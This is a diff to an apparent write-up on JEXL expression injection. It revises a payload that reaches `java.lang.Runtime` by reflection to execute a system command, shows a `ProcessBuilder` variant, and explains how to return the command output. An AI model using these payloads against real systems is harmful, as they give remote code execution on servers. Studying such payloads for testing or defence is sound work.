@@ -32,10 +32,10 @@ JEXL's `new` operator instantiates a class from its fully qualified name, and me
 new('java.lang.ProcessBuilder', ['id']).start()
 ```
 
-The classic reflection-free alternative pivots off any object's class, reaching `Runtime` through method resolution:
+An alternative pivots off any object's class to reach `Runtime` by reflection. The static `getRuntime` is not a method of the `Class` object that `forName` returns, so it is reached with `getMethod(...).invoke(null)` rather than chained directly:
 
 ```
-''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')
+''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')
 ```
 
 To read command output back into the response, wrap the started process stream, for example constructing a `java.util.Scanner` over the process input stream and reading a delimited token, all expressible through the same `new`/method-call grammar.
